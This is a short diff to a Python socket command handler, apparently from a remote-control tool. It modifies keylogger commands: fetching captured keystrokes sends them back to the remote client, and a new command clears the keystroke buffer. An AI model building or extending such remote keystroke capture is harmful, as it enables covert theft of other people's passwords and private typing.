@@ -130,14 +130,13 @@ class SV_Controller:
                     
                 elif command == "STOP_KEYLOGGER":
                     self.model.stop_keylogging()
-                    keys = self.model.fetch_keylogger()
-                    self.model.send_command(client_socket, keys)
                     
                 elif command == "FETCH_KEYLOGGER":
-                    keys = self.model.fetch_keylogger()
-                    print(keys)
+                    keys = self.model.fetch_keylogger()                    
                     self.model.send_command(client_socket, keys)
-                    
+                
+                elif command == "CLEAR_BUFFER_KEYLOGGER":
+                    keys = self.model.clear_keys()                 
                 
                 #6. Del va Copy
                 if command.startswith("COPY_FILE"):
